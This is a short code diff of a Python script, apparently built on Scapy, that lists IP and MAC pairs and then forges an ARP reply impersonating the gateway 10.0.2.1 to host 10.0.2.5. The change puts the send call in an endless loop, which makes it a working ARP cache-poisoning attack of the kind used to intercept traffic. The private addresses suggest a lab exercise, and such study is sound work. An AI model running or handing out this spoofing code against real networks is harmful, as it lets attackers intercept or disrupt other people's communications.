@@ -131,5 +131,8 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
-    packet = ARP(op=2, pdst="10.0.2.5",hwdst="08:00:27:df:ef:2c", psrc="10.0.2.1",hwsrc="08:00:27:25:04:94")
-    send(packet)
+    packet = ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:df:ef:2c",
+                     psrc="10.0.2.1", hwsrc="08:00:27:25:04:94")
+
+    while(1):
+        send(packet)
